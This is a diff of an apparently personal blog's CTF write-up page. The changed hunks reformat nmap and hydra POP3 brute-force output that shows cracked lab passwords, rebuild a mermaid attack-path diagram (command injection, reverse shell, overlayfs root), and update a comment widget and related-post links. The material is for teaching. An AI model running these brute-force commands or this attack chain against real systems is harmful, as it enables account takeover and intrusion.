@@ -109,11 +109,11 @@
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p-</span> &lt;TARGET_IP&gt; <span class="nt">-oN</span> nmap.txt
 
-PORT      STATE SERVICE  VERSION
-25/tcp    open  smtp     Postfix smtpd
-80/tcp    open  http     Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
-55006/tcp open  ssl/pop3 Dovecot pop3d
-55007/tcp open  pop3     Dovecot pop3d
+PORT STATE SERVICE VERSION
+25/tcp open smtp Postfix smtpd
+80/tcp open http Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+55006/tcp open ssl/pop3 Dovecot pop3d
+55007/tcp open pop3 Dovecot pop3d
 </code></pre></div></div>
 
 <p>SMTP, a web server, and POP3 on two non-standard ports (one over SSL). There’s no SSH exposed, which already tells me the intended path is through mail, not a shell service.</p>
@@ -152,14 +152,14 @@ VRFY natalya
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> boris <span class="nt">-P</span> /usr/share/wordlists/fasttrack.txt pop3://&lt;TARGET_IP&gt;:55007
 
-<span class="o">[</span>55007][pop3] host: &lt;TARGET_IP&gt;   login: boris   password: secret1!
+<span class="o">[</span>55007][pop3] host: &lt;TARGET_IP&gt; login: boris password: secret1!
 </code></pre></div></div>
 
 <p>Boris’s inbox is mostly noise, but one email mentions “Alec” and final codes stored somewhere on root — a hint I file away for later, not something to act on yet. What matters right now is that <code class="language-plaintext highlighter-rouge">natalya</code> also needs brute-forcing, since I don’t have her password from anywhere else:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> natalya <span class="nt">-P</span> /usr/share/wordlists/fasttrack.txt pop3://&lt;TARGET_IP&gt;:55007
 
-<span class="o">[</span>55007][pop3] host: &lt;TARGET_IP&gt;   login: natalya   password: bird
+<span class="o">[</span>55007][pop3] host: &lt;TARGET_IP&gt; login: natalya password: bird
 </code></pre></div></div>
 
 <p>Natalya’s inbox has an email from root assigning a brand-new account:</p>
@@ -268,20 +268,31 @@ creating shared library
 
 <div class="mermaid">
 graph TD
-    A["Nmap scan<br />SMTP, HTTP, POP3 exposed"] --&gt; B["terminal.js<br />HTML-entity encoded password"]
-    B --&gt; C["SMTP VRFY<br />confirms boris, natalya"]
-    C --&gt; D["Hydra POP3 brute-force<br />boris mailbox"]
-    D --&gt; E["Hydra POP3 brute-force<br />natalya mailbox"]
-    E --&gt; F["Email leak<br />xenia credentials + internal domain"]
-    F --&gt; G["Internal portal access<br />doak found, mailbox cracked"]
-    G --&gt; H["Email leak<br />dr_doak credentials"]
-    H --&gt; I["Portal file s3cret.txt<br />points to JPEG"]
-    I --&gt; J["EXIF + base64 decode<br />admin password"]
-    J --&gt; K["Admin panel<br />PSpellShell engine switch"]
-    K --&gt; L["Unvalidated path field<br />command injection"]
-    L --&gt; M["Reverse shell<br />www-data"]
-    M --&gt; N["overlayfs exploit<br />clang instead of gcc"]
-    N --&gt; O["Root shell"]
+ subgraph RECON["RECON"]
+  A["Nmap scan SMTP HTTP POP3"]
+ end
+ 
+ subgraph ENUM["ENUMERATION"]
+  B["terminal.js password descubierto"] --&gt; C["SMTP VRFY usuarios confirmados"]
+  D["Hydra POP3 brute-force"] --&gt; E["Credenciales y dominio interno"]
+  F["Portal file s3cret descubierto"] --&gt; G["EXIF + base64 decode"]
+ end
+ 
+ subgraph EXPL["EXPLOITATION"]
+  H["Admin panel acceso obtenido"] --&gt; I["PSpellShell engine switch"]
+  I --&gt; J["Command injection RCE"]
+  J --&gt; K["Reverse shell www-data"]
+ end
+ 
+ subgraph PRIVESC["PRIVESC"]
+  L["overlayfs exploit clang"] --&gt; M["Root shell obtenida"]
+ end
+ 
+ A --&gt; B
+ C --&gt; D
+ E --&gt; F
+ G --&gt; H
+ K --&gt; L
 </div>
 
 <hr />
@@ -293,6 +304,23 @@ graph TD
 <p><strong>Missing compiler doesn’t mean blocked exploit</strong> — If exploit source only references a compiler by name and not by compiler-specific behavior, swapping the name is often enough to get it running on whatever’s available.</p>
 
 <p><strong>Internal email is a lateral movement channel, not just information</strong> — Each mailbox in this room existed purely to hand off the next credential, which is a realistic pattern in orgs with weak internal mail hygiene.</p>
+
+
+  <script src="https://giscus.app/client.js"
+        data-repo="renekerr/renekerr.github.io"
+        data-repo-id="R_kgDOS3a2UA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDOS3a2UM4DCBOG"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="en"
+        crossorigin="anonymous"
+        async>
+</script>
 
 </div>
 
@@ -308,27 +336,27 @@ graph TD
     
       <li>
         <h3>
-          <a href="/ctf/web/2026/07/10/blog/">
-            Blog
-            <small>10 Jul 2026</small>
+          <a href="/ctf/puzzle/steganography/web/privesc/2026/08/19/biohazard-ctf/">
+            Biohazard CTF: Unraveling a Resident Evil Puzzle Box
+            <small>19 Aug 2026</small>
           </a>
         </h3>
       </li>
     
       <li>
         <h3>
-          <a href="/ctf/2026/07/08/watcher/">
-            Watcher
-            <small>08 Jul 2026</small>
+          <a href="/ctf/web/privesc/joomla/2026/08/16/joker-ctf/">
+            Joker CTF
+            <small>16 Aug 2026</small>
           </a>
         </h3>
       </li>
     
       <li>
         <h3>
-          <a href="/websec/2026/07/07/username-enumeration-timing/">
-            Username Enumeration via Response Timing
-            <small>07 Jul 2026</small>
+          <a href="/ctf/web/privesc/2026/08/09/boilerctf/">
+            BoilerCTF
+            <small>09 Aug 2026</small>
           </a>
         </h3>
       </li>
